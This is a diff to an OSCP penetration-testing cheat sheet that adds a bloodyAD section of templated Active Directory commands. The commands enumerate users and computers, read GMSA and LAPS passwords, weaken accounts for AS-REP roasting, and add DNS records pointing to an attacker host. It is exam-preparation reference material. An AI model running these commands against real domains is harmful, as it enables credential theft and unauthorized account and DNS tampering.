@@ -107,6 +107,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [ADCSTemplate](https://github.com/0xsyr0/OSCP#adcstemplate)
 		- [BloodHound](https://github.com/0xsyr0/OSCP#bloodhound)
 		- [BloodHound Python](https://github.com/0xsyr0/OSCP#bloodhound-python)
+  		- [bloodyAD](https://github.com/0xsyr0/OSCP#bloodyAD)
 		- [Certify](https://github.com/0xsyr0/OSCP#certify)
 		- [Certipy](https://github.com/0xsyr0/OSCP#certipy)
 		- [enum4linux-ng](https://github.com/0xsyr0/OSCP#enum4linux-ng)
@@ -2720,6 +2721,26 @@ ALTER USER neo4j SET PASSWORD '<PASSWORD>'
 bloodhound-python -d <DOMAIN> -u <USERNAME> -p "<PASSWORD>" -gc <DOMAIN> -c all -ns <RHOST>
 bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <RHOST> -c All
 bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <RHOST> -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
+```
+
+#### bloodyAD
+
+```c
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object Users --attr member                                        // Get group members
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr minPwdLength                 // Get minimum password length policy
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr msDS-Behavior-Version        // Get AD functional level
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get children 'DC=<DOMAIN>,DC=local' --type user                       // Get all users of the domain
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get children 'DC=<DOMAIN>,DC=local' --type computer                   // Get all computers of the domain
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get children 'DC=<DOMAIN>,DC=local' --type container                  // Get all containers of the domain
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> add uac <USERNAME> DONT_REQ_PREAUTH                                   // Enable DONT_REQ_PREAUTH for ASREPRoast
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> remove uac <USERNAME> ACCOUNTDISABLE                                  // Disable ACCOUNTDISABLE
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object <USERNAME> --attr userAccountControl                       // Get UserAccountControl flags
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object '<OBJECT>$' --attr msDS-ManagedPassword                    // Read GMSA account password
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object '<OBJECT>$' --attr ms-Mcs-AdmPwd                           // Read LAPS password
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr ms-DS-MachineAccountQuota    // Read quota for adding computer objects to domain
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> add dnsRecord <RECORD> <LHOST>                                        // Add a new DNS entry
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> remove dnsRecord <RECORD> <LHOST>                                     // Remove a DNS entry
+bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get dnsDump                                                           // Get AD DNS records
 ```
 
 #### Certify
